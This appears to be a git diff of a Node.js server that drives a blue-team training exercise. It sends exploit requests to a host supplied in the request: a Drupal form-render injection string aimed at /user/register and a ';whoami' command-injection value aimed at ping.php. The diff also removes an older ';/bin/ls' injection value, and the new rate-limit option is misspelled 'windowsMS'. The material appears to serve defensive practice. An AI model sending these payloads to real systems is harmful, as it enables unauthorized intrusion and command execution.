@@ -6,24 +6,32 @@ const axios = require('axios');
 const qs = require('qs');
 const path = require('path');
 const crypto = require('crypto');
+const rateLimit = require('express-rate-limit');
 const app = express();
 const PORT = 8081;
 const HOST = '0.0.0.0'
 
+var limiter = new rateLimit({
+	windowsMS: 1 * 60 * 1000,
+	max: 20,
+	message: 'Too many request from this IP, please try again in one minute'
+});
+
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static("views"));
+app.use(limiter);
 
 axios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded';
 
 var masterSalt = "";
-masterSalt=process.env.MASTER_SALT;
+if(process.env.MASTER_SALT){ 
+	masterSalt=process.env.MASTER_SALT;
+} else {
+	console.log('Expected MASTER_SALT env varaible to be set');
+}
 
 var dataCh1 = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]="
-
-var dataCh21 = qs.stringify({
-	name: ';/bin/ls'
-});
-var dataCh22 = qs.stringify({
+var dataCh2 = qs.stringify({
 	name: ';whoami '
 });
 
@@ -35,7 +43,7 @@ app.post('/attack',(req, res) => {
 	const attck = req.body.host;
 	const codeSalt = req.body.salt;
 	const challenge = req.body.radio;
-        var hash = crypto.createHash('sha256').update(codeSalt+masterSalt).digest('base64');
+        var hash = crypto.createHash('sha256').update(challenge+codeSalt+masterSalt).digest('base64');
 
 	console.log('Host: '+ attck);
 	console.log('CodeSalt ' + codeSalt);
@@ -43,7 +51,7 @@ app.post('/attack',(req, res) => {
 	console.log('Challenge: '+ challenge);
 	console.log('Hash ' + hash);
 
-	if(challenge == "1") {
+	if(challenge == "blue_ch1") {
 		axios.post(
 			'http://' + attck + ':8080/user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax',
 			dataCh1 + hash,
@@ -53,10 +61,10 @@ app.post('/attack',(req, res) => {
 			//console.log(error);
 		});
 
-	} else if (challenge == "2"){
+	} else if (challenge == "blue_ch2"){
 		axios.post(
 			'http://' + attck + ':8888/ping.php',
-			dataCh22 + hash,
+			dataCh2 + hash,
 		).then(function (response) {
 			//console.log(response);
 		})
